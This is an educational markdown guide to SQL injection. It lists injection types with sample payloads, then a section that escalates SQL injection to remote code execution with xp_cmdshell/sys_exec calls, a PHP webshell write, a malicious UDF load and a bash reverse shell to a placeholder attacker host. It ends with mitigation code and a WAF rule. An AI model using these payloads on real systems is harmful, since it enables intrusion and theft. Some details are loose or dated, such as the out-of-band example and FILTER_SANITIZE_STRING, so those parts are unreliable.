# SQl Injection

SQL Injection is a security vulnerability that allows attackers to manipulate SQL queries by injecting malicious code, potentially gaining unauthorized access to or manipulating a database.

## Types of SQL injection

### 1. In-Band SQL Injection
This is the most common type of SQL injection, where the attacker uses the same communication channel to both launch the attack and gather results.
`Subtypes:`
- ### Error-Based SQL Injection:
  The attacker causes the database to generate an error message that reveals information about the database structure.
- ### Union-Based SQL Injection:
  The attacker uses the UNION SQL operator to combine the results of the original query with results from other queries, allowing them to retrieve data from other tables.
Example:
```text
SELECT * FROM users WHERE username = 'admin' UNION SELECT password FROM users WHERE '1'='1';
```
### 2. Blind SQL Injection
In this type, the attacker does not receive any direct feedback from the database. Instead, they infer information based on the application's behavior.
`Subtypes:`
- ### Boolean-Based Blind SQL Injection:
  The attacker sends a query that returns a true or false response, allowing them to infer information based on the application's response.
- ### Time-Based Blind SQL Injection:
  The attacker uses time delays to infer information. If the query takes longer to execute, it indicates a certain condition is true.
Example:
```text
SELECT * FROM users WHERE username = 'admin' AND IF(1=1, SLEEP(5), 0);
```
### 3. Out-of-Band SQL Injection
This type occurs when the attacker is unable to use the same channel to launch the attack and gather results. Instead, they use different channels, such as sending data to an external server.
This method relies on the database's ability to make HTTP requests or DNS lookups.
Example:
```text
SELECT * FROM users WHERE username = 'admin'; EXECUTE IMMEDIATE 'SELECT * FROM users INTO OUTFILE ''/var/www/html/output.txt''';
```
### 4. Second-Order SQL Injection
In this type, the attacker injects malicious SQL code that is not immediately executed. Instead, it is stored in the database and executed later when the application processes the data.
This can occur when user input is stored and later used in a different SQL query.
Example:

An attacker submits a username with a payload that is stored:
```text
' OR 1=1; --
```
Later, when the application retrieves the username, the payload is executed.
### 5. Stored SQL Injection
This occurs when the injected SQL code is stored in the database (e.g., in a user profile or comment) and executed when the data is retrieved and displayed.
Example:

An attacker submits a comment containing SQL code:
```text
'); DROP TABLE users; --
```

## SQL TO RCE

###🔥 Step 1: Identify SQL Injection
If the application is vulnerable, we can inject:

```text
' OR 1=1 --
```
Or use UNION to extract database details:

```text
' UNION SELECT @@version, user() --
```
 ### 🔥 Step 2: Escalate SQLi to RCE (MySQL Example)
### 🛠️ Method 1: Using `sys_exec()` or xp_cmdshell
🚀 Payload (If sys_exec() is enabled)
```text
SELECT sys_exec('whoami');
```
🔹 If successful, this command will execute whoami on the server.

🚀 Payload (If using Windows and MSSQL xp_cmdshell)
```text
EXEC xp_cmdshell 'whoami';
```
### 🛠️ Method 2: Writing a Webshell via SQL Injection
🚀 Payload (Using LOAD_FILE & INTO OUTFILE)
If file privileges are enabled, we can write a PHP webshell into the web directory:
```text
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```
✅ Now, the attacker can execute remote commands:
```text
http://victim.com/shell.php?cmd=id
```
### 🛠️ Method 3: Using MySQL User-Defined Functions (UDF)
If we can create a UDF (User Defined Function) in MySQL, we can execute system commands.

🚀 Steps to Load a Malicious UDF
1️⃣ Upload a compiled malicious .so file into /usr/lib/mysql/plugin/.
2️⃣ Execute commands via:
```text
CREATE FUNCTION my_exec RETURNS STRING SONAME 'malicious.so';
SELECT my_exec('whoami');
```
### 🔥 Step 3: Escalate Privileges to Full Server Control
If we have RCE, we can:

Dump all credentials
Create a reverse shell
```text
SELECT sys_exec('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');
```
Exfiltrate sensitive files
```text
SELECT LOAD_FILE('/etc/passwd');
```

## MITIGATION OF SQL INJECTION

### 1️⃣ Use Parameterized Queries (Prepared Statements)
✅ Solution: Never concatenate user input into SQL queries. Use prepared statements instead.

🔹 Example (PHP - Secure Code Using PDO)
```text
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$user_input]);
$result = $stmt->fetch();
```
🔹 Example (Python - Secure Code Using MySQL Connector)
```text
cursor.execute("SELECT * FROM users WHERE username = %s", (user_input,))
```
🔹 Example (Java - Secure Code Using JDBC PreparedStatement)
```text
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
stmt.setString(1, userInput);
ResultSet rs = stmt.executeQuery();
```
✅ Why? Prepared statements prevent SQL code injection by treating user input as data, not code.

### 2️⃣ Use ORM (Object-Relational Mapping)
✅ Solution: Use ORM frameworks like SQLAlchemy, Hibernate, or Django ORM to avoid raw SQL queries.

🔹 Example (Python - SQLAlchemy ORM Query)
```text
user = session.query(User).filter_by(username=user_input).first()
```
🔹 Example (Django ORM Query - Secure)
```text
User.objects.filter(username=user_input)
```
✅ Why? ORMs automatically escape user input and prevent injection attacks.

### 3️⃣ Validate & Sanitize User Input
✅ Solution:

Reject special SQL characters (', --, ;, etc.).
Use allowlists instead of blocklists.
🔹 Example (PHP - Input Sanitization Using filter_var)
```text
$username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
```
🔹 Example (Python - Using Regex to Validate Input)
```text
import re
if not re.match("^[a-zA-Z0-9_]+$", user_input):
    raise ValueError("Invalid input!")
```
✅ Why? Prevents attackers from injecting malicious SQL payloads.

### 4️⃣ Restrict Database Privileges
✅ Solution:

Use the least privilege principle (LIMIT database user permissions).
The application should only have access to necessary tables.
Disable dangerous functions (xp_cmdshell, LOAD_FILE(), etc.).
🔹 Example (MySQL - Create a User with Restricted Privileges)
```text
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'strongpassword';
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'appuser'@'localhost';
```
✅ Why? Even if SQLi happens, it limits the attack scope.

### 5️⃣ Use Web Application Firewall (WAF)
✅ Solution: Deploy a WAF to detect and block SQLi attacks in real time.

ModSecurity (Open-source WAF for Apache/Nginx)
Cloudflare WAF
AWS WAF
🔹 Example (ModSecurity Rule to Block SQLi)
```text
SecRule REQUEST_URI|ARGS|BODY "(union.*select|select.*from.*information_schema)" "deny,status:403"
```
✅ Why? Adds an extra layer of protection against known SQLi patterns.

### 6️⃣ Secure Error Handling
✅ Solution:

Disable detailed error messages in production.
Use generic error responses instead of exposing SQL errors.
🔹 Example (PHP - Disable Error Display in Production)
```text
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
```
🔹 Example (Python Flask - Generic Error Message Handling)
```text
@app.errorhandler(500)
def internal_error(error):
    return "An error occurred. Please try again later.", 500
```
✅ Why? Prevents attackers from gaining insights into database structure.

### 7️⃣ Escape User Input (If You Must Use Dynamic Queries)
✅ Solution: If prepared statements are not possible, escape user input manually.

🔹 Example (PHP - Escape Input Using mysqli_real_escape_string)
```text
$username = mysqli_real_escape_string($conn, $_POST['username']);
$query = "SELECT * FROM users WHERE username = '$username'";
```
